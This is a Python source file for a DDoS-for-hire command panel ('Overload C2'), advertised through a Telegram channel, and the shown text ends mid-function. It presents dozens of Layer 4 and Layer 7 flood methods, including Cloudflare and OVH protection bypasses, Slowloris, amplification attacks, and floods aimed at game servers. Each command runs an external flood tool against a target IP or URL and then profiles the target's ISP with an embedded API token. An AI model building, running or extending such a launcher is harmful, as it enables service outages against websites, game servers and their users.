import socket
import builtins
import os
import requests
import random
import getpass
import time
import sys
import math
import subprocess
import threading
import json
import urllib.parse
import string
from termcolor import colored
from rich import print
from rich.table import Table
from tabulate import tabulate
from colorama import Fore, Style, init
    
proxys = open('proxies.txt').readlines()
bots = len(proxys)

def clear_screen():
    os.system('cls'if os.name == 'nt'else'clear')

init() 
                           
def get_ip_info(token, ip=None):
    ip_url = f"https://ipinfo.io/{ip}?token={token}"
    response = requests.get(ip_url)

    if response.ok:
        data = response.json()
        simple_data = {
            "ASN": data.get("asn"),
            "Organisasi": data.get("org"),
            "ISP": data.get("isp"),
            "IP": data.get("ip")
        }
        print("[bold yellow]Informasi IP[/bold yellow]")
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("Detail")
        table.add_column("Informasi")
        for key, value in simple_data.items():
            if value:
                table.add_row(key, value)
        print(table)
        return data
    else:
        print(f"[bold red]Error saat mengambil info IP untuk {ip}:[/bold red] {response.text}")
        return None

def get_url_info(url, token):
    parsed_url = urllib.parse.urlparse(url)
    hostname = parsed_url.netloc
    api_endpoint = f"https://host.io/api/web/{hostname}?token={token}"
    response_hostio = requests.get(api_endpoint)

    if response_hostio.status_code == 200:
        data_hostio = response_hostio.json()
        ip_address = data_hostio.get("ip") # Asumsi ada kunci 'ip'

        if ip_address:
            ip_url_ipinfo = f"https://ipinfo.io/{ip_address}?token={token}"
            response_ipinfo = requests.get(ip_url_ipinfo)
            if response_ipinfo.ok:
                data_ipinfo = response_ipinfo.json()
                simple_data = {
                    "ASN": data_ipinfo.get("asn"),
                    "Organisasi": data_ipinfo.get("org"),
                    "ISP": data_ipinfo.get("isp"),
                    "IP": data_ipinfo.get("ip")
                }
                print(f"[bold yellow]Informasi URL untuk {url}[/bold yellow]")
                table = Table(show_header=True, header_style="bold magenta")
                table.add_column("Detail")
                table.add_column("Informasi")
                for key, value in simple_data.items():
                    if value:
                        table.add_row(key, value)
                print(table)
                return simple_data
            else:
                print(f"[bold red]Error saat mengambil info IP untuk {ip_address}:[/bold red] {response_ipinfo.text}")
                return None
        else:
            print(f"[yellow]Tidak dapat menemukan alamat IP untuk {url}.[/yellow]")
            return None
    else:
        print(f"[bold red]Error saat mengambil informasi URL untuk {url}:[/bold red] {response_hostio.text}")
        return None
                                                                                                                                                                                                                                                                                   
def si(): 
    print('         [ t.me/POWERPROOFOVERLOAD ] | Welcome to Overload DDOS! | Owner: @OverloadServer | Update v3.0')
    print("")                

def layer7():
    clear_screen()
    si() # Memanggil fungsi si()
    print("--------------------------------------------------")
    print("                LAYER 7 METHODS                   ")
    print("--------------------------------------------------")
    print("▶ httpbypass    : Metode bypass HTTP umum untuk WAF/CDN (misalnya Cloudflare/Captcha)")
    print("▶ cfgas         : Cloudflare GAS (Serangan banjir HTTP/S tingkat tinggi dengan logika bypass)")
    print("▶ http-storm    : Metode banjir HTTP volume tinggi")
    print("▶ tls           : Serangan Banjir TLS Handshake (menguras sumber daya TLS server)")
    print("▶ cf-bypass     : Metode bypass Cloudflare generik")
    print("▶ uambypass     : Bypass untuk 'Under Attack Mode' Cloudflare")
    print("▶ httpget       : Serangan banjir permintaan HTTP GET standar")
    print("▶ auto          : Pemilihan metode serangan otomatis berdasarkan analisis target")
    print("▶ crash         : Upaya untuk merusak server target (misalnya, melalui permintaan yang salah format)")
    print("▶ httpflood     : Banjir HTTP dasar (tingkat tinggi, berbagai jenis permintaan)")
    print("▶ httpssl     : Serangan yang menargetkan komunikasi terenkripsi menggunakan protokol HTTPS/SSL")
    print("▶ cf-socket     : Serangan berbasis soket tingkat rendah untuk target yang dilindungi Cloudflare")
    print("▶ cf-pro        : Teknik bypass Cloudflare yang lebih canggih atau 'profesional'")
    print("▶ hyper         : Serangan dengan laju permintaan yang sangat tinggi")
    print("▶ slow          : Serangan mirip Slowloris (mempertahankan koneksi lambat untuk menguras sumber daya server)")
    print("▶ https-spoof   : Mencoba memalsukan permintaan HTTPS agar terlihat sah atau melewati filter")
    print("▶ http-requests : Metode umum untuk mengirim berbagai jenis permintaan HTTP")
    print("--------------------------------------------------")

# Catatan: Pastikan fungsi `clear_screen()` dan `si()` sudah terdefinisi di bagian lain kode Anda.

def layer4():
    clear_screen()
    si() # Memanggil fungsi si()
    print("--------------------------------------------------")
    print("                LAYER 4 METHODS                   ")
    print("--------------------------------------------------")
    print("▶ udp          : Banjir paket UDP dasar")
    print("▶ tcp          : Banjir paket TCP (SYN, ACK, dll.)")
    print("▶ nfo-killer   : Banjir khusus yang menargetkan server game (seringkali NFOservers)")
    print("▶ std          : Banjir generik standar (umum untuk Layer 4)")
    print("▶ udpbypass    : Upaya untuk melewati perlindungan banjir UDP")
    print("▶ destroy      : Banjir intens yang bertujuan membanjiri dan merusak layanan")
    print("▶ home         : Banjir generik untuk beban umum")
    print("▶ god          : Metode banjir yang sangat kuat atau serbaguna")
    print("▶ slowloris    : Serangan Slowloris (mempertahankan koneksi lambat untuk menguras sumber daya server - *Catatan: Ini adalah metode Layer 7*)")
    print("▶ flux         : Banjir yang terkait dengan serangan DNS (mis. DNS Flux/Subdomain acak)")
    print("▶ stdv2        : Banjir standar versi 2 (versi yang diperbarui)")
    print("▶ ovh-raw      : Banjir paket mentah yang menargetkan server yang dilindungi OVH")
    print("▶ ovh-beam     : Teknik banjir spesifik untuk perlindungan OVH")
    print("▶ overflow     : Banjir yang mencoba menyebabkan *buffer overflow* atau kehabisan sumber daya")
    print("▶ ovh-amp      : Serangan amplifikasi yang menargetkan OVH")
    print("▶ minecraft    : Banjir khusus yang menargetkan server Minecraft")
    print("▶ samp         : Banjir khusus yang menargetkan server San Andreas Multiplayer (SA-MP)")
    print("▶ ldap         : Banjir Amplifikasi LDAP")
    print("--------------------------------------------------")

# Catatan: Pastikan fungsi `clear_screen()` dan `si()` sudah terdefinisi di bagian lain kode Anda.

def usage():
    clear_screen()
    si() # Memanggil fungsi si()
    print("--------------------------------------------------")
    print("        USAGE METODE LAYER 7 & LAYER 4         ")
    print("--------------------------------------------------")

    print("\n--- METODE LAYER 7 ---")
    print("▶ httpbypass    : httpbypass https://target.com 60")
    print("▶ cfgas         : cfgas https://target.com 60")
    print("▶ http-storm    : http-storm https://target.com 60")
    print("▶ tls           : tls https://target.com 60")
    print("▶ cf-bypass     : cf-bypass https://target.com 60")
    print("▶ uambypass     : uambypass https://target.com 60")
    print("▶ httpget       : httpget https://target.com 60")
    print("▶ auto          : auto https://target.com 60")
    print("▶ crash         : crash https://target.com GET")
    print("▶ httpflood     : httpflood https://target.com 15000 get 60")
    print("▶ httpssl     : httpssl https://target.com port 60")
    print("▶ cf-socket     : cf-socket https://target.com 60 100 100")
    print("▶ cf-pro        : cf-pro https://target.com 60 100 100")
    print("▶ hyper         : hyper https://target.com 60")
    print("▶ slow          : slow https://target.com 60")
    print("▶ https-spoof   : https-spoof https://target.com 60")
    print("▶ http-requests : http-requests https://target.com 60")

    print("\n--- METODE LAYER 4 ---")
    print("▶ udp          : udp 1.1.1.1 port")
    print("▶ tcp          : tcp GET/POST/HEAD 1.1.1.1 port 60 8500")
    print("▶ nfo-killer   : nfo-killer 1.1.1.1 port 850 60")
    print("▶ std          : std 1.1.1.1 port")
    print("▶ udpbypass    : udpbypass 1.1.1.1 port")
    print("▶ destroy      : destroy 1.1.1.1 port 60")
    print("▶ home         : home 1.1.1.1 port 65500 60")
    print("▶ god          : god 1.1.1.1 port 60")
    print("▶ slowloris    : slowloris 1.1.1.1 port")
    print("▶ flux         : flux 1.1.1.1 port 250")
    print("▶ stdv2        : stdv2 1.1.1.1 port")
    print("▶ ovh-raw      : ovh-raw GET 1.1.1.1 port 60 8500")
    print("▶ ovh-beam     : ovh-beam GET 1.1.1.1 port 60")
    print("▶ overflow     : overflow 1.1.1.1 port 5000")
    print("▶ ovh-amp      : ovh-amp 1.1.1.1 port")
    print("▶ minecraft    : minecraft 1.1.1.1 5000 500 60")
    print("▶ samp         : samp 1.1.1.1 7777'")
    print("▶ ldap         : ldap 1.1.1.1 port 650 60")
    print("--------------------------------------------------")

# Catatan: Pastikan fungsi `clear_screen()` dan `si()` sudah terdefinisi di bagian lain kode Anda.

# Fungsi getproxy sudah didefinisikan dengan benar di tingkat global
def getproxy():
    clear_screen()
    si() # Memanggil fungsi si()
    print("Starting proxy collection process...")
    # Langsung jalankan skrip getproxy.py tanpa argumen
    os.system('python3 getproxy.py')
    print("Proxy save succesfull. Please check from proxies.txt.")
   
def menu():
    # Mengatur judul jendela terminal (jika didukung)
    sys.stdout.write(f"         \x1b]2;Overload Server --> Online Botnet: [{bots}] | Stresser Panel | VIP (true)\x07")
    clear_screen()
    
    # Pesan informasi awal dengan efek kedip MERAH
    print("\x1b[5;31m" + '[ t.me/POWERPROOFOVERLOAD ] | Welcome to Overload DDOS! | Owner: @OverloadServer | Update v3.0' + "\x1b[0m")
    print("")

    # Seni ASCII (logo) - Diatur ke warna PUTIH statis untuk kontras
    print("\x1b[37m" + """  
                            ████████████                
                       ██████         ██████          
                    ████                    ████                
                   ██                            ██      
                                              
                            ████████████                
                           ██            ██              
                          ██              ██            
                                              
                                              
                                 ████                    
                               ██    ██                  
                               ██    ██                  
                               ██    ██                  
                               ██    ██                  
                               ██    ██                  
    ██████████████████████████████████████    
  ██                                         ██  
██    ████                                    ██
██  ██    ██                                  ██
██  ██    ██                                  ██
██    ████                                    ██
  ██                                         ██
    ██████████████████████████████████████    
""" + "\x1b[0m") # Reset warna setelah seni ASCII

    # --- Integrasi Banner yang sudah dirapikan dengan warna & efek kedip ---
    box_content_width = 66 

    # Fungsi bantu untuk menggambar garis border atas
    def draw_top_border(width):
        return f"╔{'═' * width}╗"

    # Fungsi bantu untuk menggambar garis border bawah
    def draw_bottom_border(width):
        return f"╚{'═' * width}╝"

    # Fungsi bantu yang dimodifikasi untuk menerima kode warna dan opsi kedip
    def draw_middle_line(text, width, align='center', color_code="", blink=False):
        if align == 'center':
            padded_text = text.center(width)
        elif align == 'left':
            padded_text = text.ljust(width)
        
        start_code = ""
        end_code = ""
        
        if blink:
            start_code += "\x1b[5m" # Tambahkan kode kedip
        if color_code:
            start_code += color_code # Tambahkan kode warna

        if start_code: # Hanya tambahkan reset jika ada gaya yang diterapkan
            end_code = "\x1b[0m"

        return f"║{start_code}{padded_text}{end_code}║"
    
    # --- Banner Selamat Datang ---
    print(draw_top_border(box_content_width))
    # Teks "WELCOME TO OVERLOAD C2" akan berkedip PUTIH
    print(draw_middle_line("WELCOME TO OVERLOAD C2", box_content_width, color_code="\x1b[37m", blink=True)) 
    # Teks copyright akan PUTIH statis
    print(draw_middle_line("- - - - - - Copyright 2024-2026 [OverloadServer] - - - - - - -", box_content_width, color_code="\x1b[37m")) 
    print(draw_bottom_border(box_content_width))

    print("") # Baris kosong sebagai pemisah

    # --- Banner Telegram ---
    print(draw_top_border(box_content_width))
    # Teks Telegram akan berkedip MERAH
    print(draw_middle_line(">T.ME/POWERPROOFOVERLOAD< BEST ATTACK SERVICE", box_content_width, color_code="\x1b[31m", blink=True)) 
    print(draw_bottom_border(box_content_width))

    print("") # Baris kosong sebagai pemisah

    # --- Banner Menu Utama ---
    print(draw_top_border(box_content_width))
    # Teks menu akan PUTIH statis
    print(draw_middle_line("LAYER7  ► SHOW LAYER7 METHODS FOR ATTACK DOMAIN", box_content_width, align='left', color_code="\x1b[37m")) 
    print(draw_middle_line("LAYER4  ► SHOW LAYER4 METHODS FOR ATTACK IP", box_content_width, align='left', color_code="\x1b[37m")) 
    print(draw_middle_line("USAGE   ► USAGE PANEL", box_content_width, align='left', color_code="\x1b[37m"))
    print(draw_middle_line("GETPROXY   ► UPDATE PROXY", box_content_width, align='left', color_code="\x1b[37m"))
    print(draw_middle_line("CLEAR   ► CLEAR TERMINAL", box_content_width, align='left', color_code="\x1b[37m")) 
    print(draw_bottom_border(box_content_width))

# Catatan Penting:
# - Pastikan variabel `bots` terdefinisi di kode Anda.
# - Efek kedip dan warna ini menggunakan kode ANSI escape. Dukungan dan tampilan bisa bervariasi
#   tergantung pada terminal yang Anda gunakan (misalnya, CMD Windows mungkin tidak mendukung penuh).
# - Fungsi `clear_screen()` dan `si()` diasumsikan sudah terdefinisi di bagian lain dari skrip Anda.

def main():
    menu() # Memanggil fungsi menu untuk menampilkan tampilan awal
    while(True):        
        # Prompt untuk input pengguna
        print('\033[ROOT\033] \033►\033[KOMINFO] ', end='')
        cnc = input().strip() # Menggunakan .strip() untuk menghapus spasi di awal/akhir
        print("Anda memasukkan:", cnc)
        
        # Normalisasi input ke huruf kecil untuk perbandingan yang lebih mudah dan case-insensitive
        command_lower = cnc.lower()

        if command_lower in ["layer7", "l7"]: # Kondisi disederhanakan
            layer7()
        elif command_lower in ["layer4", "l4"]: # Kondisi disederhanakan
            layer4()
        elif command_lower in ["clear", "cls"]: # Kondisi disederhanakan
            clear_screen() # Panggil clear_screen() untuk membersihkan terminal
            menu() # Tampilkan kembali menu setelah membersihkan layar
        elif command_lower == "usage": # Kondisi disederhanakan, hapus redundansi
            usage() 
        elif command_lower == "getproxy": # Kondisi disederhanakan, hapus redundansi
            getproxy() # Panggilan ke fungsi getproxy() yang didefinisikan di atas
    
# LAYER 4 METHODS   

        elif "udpbypass" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./UDPBYPASS {ip} {port}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)    
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: udpbypass <ip> <port>')
                print('Example: udpbypass 1.1.1.1 80')

        elif "stdv2" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./std {ip} {port}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: stdv2 <ip> <port>')
                print('Example: stdv2 1.1.1.1 80')

        elif "flux" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'./flux {ip} {port} 250 0')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: flux <ip> <port> <threads>')
                print('Example: flux 1.1.1.1 80 250')

        elif "slowloris" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./slowloris {ip} {port}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: slowloris <ip> <port>')
                print('Example: slowloris 1.1.1.1 80')

        elif "god" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl god.pl {ip} {port} 65500 {time}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: god <ip> <port> <time>')
                print('Example: god 1.1.1.1 80 60')

        elif "destroy" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl destroy.pl {ip} {port} 65500 {time}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: destroy <ip> <port> <time>')
                print('Example: destroy 1.1.1.1 80 60')

        elif "std" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./STD-NOSPOOF {ip} {port}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: std <ip> <port>')
                print('Example: std 1.1.1.1 80')

        elif "home" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                psize = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'perl home.pl {ip} {port} 65500 {time}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: home <ip> <port> <packet_size> <time>')
                print('Example: home 1.1.1.1 80 65500 60')

        elif "udp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python2 udp.py {ip} {port} 0 0')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: udp <ip> <port>')
                print('Example: udp 1.1.1.1 80')

        elif "nfo-killer" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./nfo-killer {ip} {port} 850 -1 {time}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: nfo-killer <ip> <port> <threads> <time>')
                print('Example: nfo-killer 1.1.1.1 80 850 60')

        elif "ovh-raw" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./ovh-raw {method} {ip} {port} {time} 8500')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: ovh-raw METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: ovh-raw GET 1.1.1.1 80 60 8500')

        elif "tcp" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./100UP-TCP {method} {ip} {port} {time} 8500')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: tcp METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: tcp GET 1.1.1.1 80 60 8500')
                
        elif "ovh-beam" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4] 
                os.system(f'./OVH-BEAM {method} {ip} {port} {time} 1024')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>')
                print('Example: ovh-beam GET 51.38.92.223 80 60')
                
        elif "overflow" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'./OVERFLOW {ip} {port} {thread}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: overflow <ip> <port> <threads>')
                print('Example: overflow 1.1.1.1 80 5000')
               
        elif "samp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python2 samp.py {ip} {port}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: samp <ip> <port>')
                print('Example: samp 1.1.1.1 7777')

        elif "ldap" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./ldap {ip} {port} 650 -1 {time}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: ldap <ip> <port> <threads> <time>')
                print('Example: ldap 1.1.1.1 80 650 60')

        elif "minecraft" in cnc:
            try:
                ip = cnc.split()[1]
                throttle = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./MINECRAFT-SLAM {ip} 5000 500 {time}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: minecraft <ip> <throttle> <threads> <time>')
                print('Example: minecraft 1.1.1.1 5000 500 60')

        elif "ovh-amp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./OVH-AMP {ip} {port}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: ovh-amp <ip> <port>')
                print('Example: ovh-amp 1.1.1.1 80')
                
        elif "ntp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                throttle = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./ntp {ip} {port} ntp.txt 250 {time}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: ntp <ip> <port> <throttle> <time>')
                print('Example: ntp 1.1.1.1 22 250 60')     
                
# LAYER 7 METHODS
    
        elif "https-spoof" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'python3 https-spoof.py {url} {time} 100')
                url = f"{url}"
                token = "727e8c2fa5b07c"
                result = get_url_info(url, token)
                print(result) 
            except IndexError:
                print('Usage: https-spoof <url> <time> <threads>')
                print('Example: https-spoof http://vailon.com 60 500')     
                
        elif "httpssl" in cnc:
            try:
                url = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]               
                os.system(f'go run stress.go {url} {port} 3 100 {time} 100')
                url = f"{url}"
                token = "727e8c2fa5b07c"
                result = get_url_info(url, token)
                print(result) 
            except IndexError:
                print('Usage: httpssl <url> <port> <time>')
                print('Example: httpssl https://lol.com 443 60')                             
        
        elif "slow" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
               
               os.system(f'node slow.js {url} {time}')          
               
               url = f"{url}"
               token = "727e8c2fa5b07c"
               result = get_url_info(url, token)
               print(result)             
                
               sys.stdout.write(f"\x1b]2; T.ME/POWERPROOFOVERLOAD\x07")
               sys.stdout.flush()
               
               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: slow
               Ketik [CLS] untuk membersihkan terminal""")
                          
            except IndexError:
                print('Penggunaan: slow <url> <waktu>')
                print('Contoh: slow http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")
    
        elif "hyper" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
               
               os.system(f'node hyper.js {url} {time}')
                
               url = f"{url}"
               token = "727e8c2fa5b07c"          
               result = get_url_info(url, token)
               print(result) 
                
               sys.stdout.write(f"\x1b]2; T.ME/POWERPROOFOVERLOAD\x07")
               sys.stdout.flush()
               
               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: hyper
               Ketik [CLS] untuk membersihkan terminal""") 
                         
            except IndexError:
                print('Penggunaan: hyper <url> <waktu>')
                print('Contoh: hyper http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")
                
        elif "jebol" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
               
               os.system(f'python3 jebol.py {url} {time}')          
               
               url = f"{url}"
               token = "727e8c2fa5b07c"
               result = get_url_info(url, token)
               print(result)             
                
               sys.stdout.write(f"\x1b]2; T.ME/POWERPROOFOVERLOAD\x07")
               sys.stdout.flush()
               
               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: slow
               Ketik [CLS] untuk membersihkan terminal""")
                          
            except IndexError:
                print('Penggunaan: jebol <url> <waktu>')
                print('Contoh: jebol http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")        
                
        elif "cf-socket" in cnc:
            try:
                os.system(f'python3 bypass.py')
                url = f"{url}"
                token = "727e8c2fa5b07c"
                result = get_url_info(url, token)
                print(result) 
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('cf-socket')
    
        elif "cf-pro" in cnc:
            try:
                os.system(f'python3 cf-pro.py')
                url = f"{url}"
                token = "727e8c2fa5b07c"
                result = get_url_info(url, token)
                print(result) 
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('cf-pro')
        
        elif "cfgas" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
                             
               os.system(f'node cfgasv2 {url} {time} 100 100 proxies.txt')
               
               url = f"{url}"
               token = "727e8c2fa5b07c"
               result = get_url_info(url, token)
               print(result) 
                
               sys.stdout.write(f"\x1b]2; T.ME/POWERPROOFOVERLOAD\x07")
               sys.stdout.flush()
               
               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: cfgas
               Ketik [CLS] untuk membersihkan terminal""") 
                         
            except IndexError:
                print('Penggunaan: cfgas <url> <waktu>')
                print('Contoh: cfgas http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")

        elif "httpbypass" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
                
               os.system(f'node httpbypass {url} {time} 100 100 proxies.txt')
               os.system(f'node httpbypassv2 {url} {time} 100 100 proxies.txt')
                
               url = f"{url}"
               token = "727e8c2fa5b07c"
               result = get_url_info(url, token)
               print(result) 
                
               sys.stdout.write(f"\x1b]2; T.ME/POWERPROOFOVERLOAD\x07")
               sys.stdout.flush()
               
               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: httpbypass
               Ketik [CLS] untuk membersihkan terminal""")  
                        
            except IndexError:
                print('Penggunaan: httpbypass <url> <waktu>')
                print('Contoh: httpbypass http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}") 

        elif "http-requests" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
               
               os.system(f'node http-requests.js {url} {time}')
               
               url = f"{url}"
               token = "727e8c2fa5b07c"
               result = get_url_info(url, token)
               print(result) 
                
               sys.stdout.write(f"\x1b]2; T.ME/POWERPROOFOVERLOAD\x07")
               sys.stdout.flush()
               
               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: http-requests
               Ketik [CLS] untuk membersihkan terminal""")  
                        
            except IndexError:
                print('Penggunaan: http-requests <url> <waktu>')
                print('Contoh: http-requests http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")

        elif "tls" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
                               
               os.system(f'node tlsv2 {url} {time} 100 100 proxies.txt')
               os.system(f'node tlsv3 {url} {time} 100 100 proxies.txt')             
               
               url = f"{url}"
               token = "727e8c2fa5b07c"
               result = get_url_info(url, token)
               print(result) 
                
               sys.stdout.write(f"\x1b]2; T.ME/POWERPROOFOVERLOAD\x07")
               sys.stdout.flush()
               
               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: tls
               Ketik [CLS] untuk membersihkan terminal""") 
                         
            except IndexError:
                print('Penggunaan: tls <url> <waktu>')
                print('Contoh: tls http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}") 

        elif "auto" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
                     
               os.system(f'node auto.js {url} {time} 100 100 proxies.txt')
               os.system(f'node autov2.js {url} {time} 100 100 proxies.txt')

               url = f"{url}"
               token = "727e8c2fa5b07c"
               result = get_url_info(url, token)
               print(result) 

               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: auto
               Ketik [CLS] untuk membersihkan terminal""")

               sys.stdout.write(f"\x1b]2; T.ME/POWERPROOFOVERLOAD\x07")
               sys.stdout.flush()

            except IndexError:
                print('Penggunaan: auto <url> <waktu>')
                print('Contoh: auto http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")    

        elif "cf-bypass" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
               
               os.system(f'node cf.js {url} {time} 1250 proxies.txt')
                
               url = f"{url}"
               token = "727e8c2fa5b07c"
               result = get_url_info(url, token)
               print(result) 
                
